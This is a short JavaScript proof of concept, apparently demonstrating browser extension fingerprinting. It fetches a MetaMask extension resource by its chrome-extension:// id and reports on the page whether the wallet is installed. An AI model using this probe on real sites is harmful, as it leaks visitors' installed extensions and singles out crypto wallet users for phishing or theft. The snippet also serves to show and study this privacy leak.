
async function getExt(url, name) {
  let req = await fetch(url);
  let res = await req.status;
  if (res == 200) {
    document.getElementById("extensionsDiv").innerHTML += name;
  }
}

var leakInstalledExtensions = async function() {
  var extensions = [{
    id: "nkbihfbeogaeaoehlefnkodbefgpgknn",
		resource: "/phishing.html",
		name: "Metamask"
	}, {
    id: "",
    resource: "",
    name: ""
  }];
    extensions.forEach(function(network) {
        getExt("chrome-extension://"+ network.id + network.resource, network.name);
    });
};

leakInstalledExtensions();
